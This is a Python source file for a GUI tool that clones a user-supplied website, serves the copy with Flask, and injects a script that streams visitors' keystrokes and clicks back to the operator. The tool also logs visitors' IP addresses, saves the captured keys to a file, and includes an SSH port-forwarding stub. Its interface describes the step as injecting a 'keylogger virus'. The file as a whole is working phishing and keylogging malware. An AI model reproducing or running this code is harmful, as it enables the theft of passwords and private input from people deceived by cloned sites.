import os
import requests
import webbrowser
import threading
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import filedialog
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import paramiko
import time
import tkinter.font as tkFont

# Initialize Flask app
app = Flask(__name__)
socketio = SocketIO(app, async_mode='threading')

# Global variables
cloned_html = ""
keystrokes = []

def clone_website(url):
    global cloned_html
    response = requests.get(url)
    if response.status_code == 200:
        cloned_html = response.text
        # Inject event tracking script into the cloned HTML
        tracking_script = """
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            const socket = io();
            document.addEventListener('keydown', function(event) {
                const keystroke = `${event.key}`;
                socket.emit('keystroke', keystroke);
            });
            document.addEventListener('click', function(event) {
                const clickInfo = `Clicked at (${event.clientX}, ${event.clientY})`;
                socket.emit('click', clickInfo);
            });
        </script>
        """
        cloned_html = cloned_html.replace("</body>", tracking_script + "</body>")
    else:
        print(f"Failed to clone website: {response.status_code}")

@app.route('/')
def index():
    return render_template_string(cloned_html)

@socketio.on('connect')
def handle_connect():
    client_ip = request.remote_addr
    print(f"[+] DEVICE CONNECTED:")
    print(f"[+] IP: {client_ip}")

@socketio.on('keystroke')
def handle_keystroke(data):
    keystrokes.append(data)
    status_text.config(state=tk.NORMAL)
    status_text.insert(tk.END, f"[ + ] KEY STROKES CAPTURED: {data}\n")
    status_text.config(state=tk.DISABLED)
    status_text.see(tk.END)  # Scroll to the end to show the latest keystroke

@socketio.on('click')
def handle_click(data):
    status_text.config(state=tk.NORMAL)
    status_text.insert(tk.END, f"[ + ] CLICK EVENT: {data}\n")
    status_text.config(state=tk.DISABLED)
    status_text.see(tk.END)
    print(f"[+] CLICK EVENT: {data}")

def open_browser():
    webbrowser.open('http://localhost:5000')

def start_server(url):
    clone_website(url)
    socketio.run(app, host='0.0.0.0', port=5000)

def port_forward():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('your.remote.server', username='yourusername', password='yourpassword')
    stdin, stdout, stderr = ssh.exec_command('command to port forward')
    print(stdout.read().decode())
    ssh.close()

def save_keylog():
    # Open file dialog to choose where to save the keylog file
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if file_path:
        with open(file_path, "w") as f:
            for keystroke in keystrokes:
                f.write(keystroke + "\n")

def update_progress(step, text):
    status_text.config(state=tk.NORMAL)
    status_text.insert(tk.END, text + "\n")
    status_text.config(state=tk.DISABLED)
    progress_bar.step(step)

def on_start_keylogger():
    url = url_entry.get()
    threading.Thread(target=start_server, args=(url,)).start()
    text_animation()

# New text animation and progress update function
def text_animation():
    steps = [
        "PLEASE WAIT ...",
        "VERIFYING WEBSITE . . .",
        "CLONING WEBSITE ...",
        "DOWNLOADING WEBSITE . . .",
        "PLEASE WAIT . . .",
        "INJECTING KEYLOGGER VIRUS IN WEBSITE . . .",
        "SUCCESSFULLY CREATED KEYLOGGER WEBSITE"
    ]

    step_delay = 0.5
    fade_steps = 5
    progress_increment = 100 / len(steps)

    for i, step in enumerate(steps):
        for fade in range(fade_steps):
            alpha = fade / fade_steps
            fade_color = f'#{int(255 * (1 - alpha)):02x}{int(255 * (1 - alpha)):02x}{int(255 * (1 - alpha)):02x}'
            step_label.config(text=step, fg=fade_color)
            progress_bar['value'] = int((i + (fade / fade_steps)) * progress_increment)
            root.update_idletasks()
            time.sleep(step_delay / fade_steps)
        time.sleep(step_delay)  # Simulating processing time

    # Open the browser after the animation is complete
    open_browser()

# GUI Setup
# GUI Setup
root = tk.Tk()
root.title("$Avsus Key strokes capture")

main_frame = ttk.Frame(root, padding="10 10 10 10")  # Adjust the padding to extend the progress bar
main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

font = tkFont.Font(family="Play", size=12)

# Text with normal "may" and Play, sans-serif font
note_text = tk.Label(main_frame, text="THIS TOOL *MAY* NOT WORK WITH COMPLEX WEBSITE THANKYOU :-) STILL TRYING TO FIX IT.")
note_text.configure(font=font)
note_text.grid(row=5, column=0, columnspan=3, pady=10, sticky=tk.W)

url_label = ttk.Label(main_frame, text="Enter your custom website URL:", font=font)
url_label.grid(row=0, column=0, sticky=tk.W)
url_entry = ttk.Entry(main_frame, width=50, font=font)
url_entry.grid(row=0, column=1, sticky=(tk.W, tk.E))

start_button = ttk.Button(main_frame, text="Start Key Logger", command=on_start_keylogger, style="Custom.TButton")
start_button.grid(row=0, column=2, sticky=tk.E)

# Increase the length of the progress bar
progress_bar = ttk.Progressbar(main_frame, orient="horizontal", length=700, mode="determinate")
progress_bar.grid(row=1, column=0, columnspan=3, pady=20, ipady=5)

step_label = tk.Label(main_frame, text="", font=font)
step_label.grid(row=2, column=0, columnspan=3, pady=10)

status_text = scrolledtext.ScrolledText(main_frame, state=tk.DISABLED, width=60, height=10, font=font)
status_text.grid(row=3, column=0, columnspan=3)

port_forward_button = ttk.Button(main_frame, text="Port Forwarding", command=port_forward, style="Custom.TButton")
port_forward_button.grid(row=4, column=0, pady=10)

save_keylog_button = ttk.Button(main_frame, text="Save Keylog", command=save_keylog, style="Custom.TButton")
save_keylog_button.grid(row=4, column=1, pady=10)

# Define custom style for buttons
style = ttk.Style()
style.configure("Custom.TButton", font=("Play", 12))

root.mainloop()
